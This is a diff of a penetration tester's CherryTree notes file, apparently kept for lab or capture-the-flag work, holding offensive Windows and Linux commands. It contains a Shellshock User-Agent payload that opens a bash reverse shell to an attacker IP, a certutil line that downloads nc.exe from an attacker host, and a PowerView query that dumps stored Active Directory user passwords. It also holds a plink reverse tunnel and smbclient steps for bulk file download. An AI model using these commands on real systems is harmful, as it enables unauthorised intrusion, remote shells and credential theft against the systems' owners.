@@ -651,8 +651,14 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 </rich_text>
     </node>
-    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1663605130">
-      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe</rich_text>
+    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1666343805">
+      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
+
+</rich_text>
+      <rich_text family="monospace">Invoke-WebRequest $myDownloadUrl -OutFile c:\file.ext
+</rich_text>
+      <rich_text>
+</rich_text>
     </node>
     <node name="check .net version" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784197" ts_lastsave="1664784319">
       <rich_text>C:\windows\microsoft.net\framework&gt; ls</rich_text>
@@ -694,7 +700,14 @@ Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
     <node name="plink_tunnel" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828699" ts_lastsave="1665829950">
       <rich_text>C:\temp\plink.exe -l kali -pw kali 10.10.16.5 -R 3306:127.0.0.1:3306 -P 2222 &lt;&lt; working plink mysql forward using cmd.exe (nc.exe)</rich_text>
     </node>
-    <node name="smbclient" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666013032" ts_lastsave="1666013032"/>
+    <node name="smbclient" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666013032" ts_lastsave="1666013047">
+      <rich_text>download recursive
+
+mask ""
+recurse ON
+prompt OFF
+mget *</rich_text>
+    </node>
   </node>
   <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
     <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
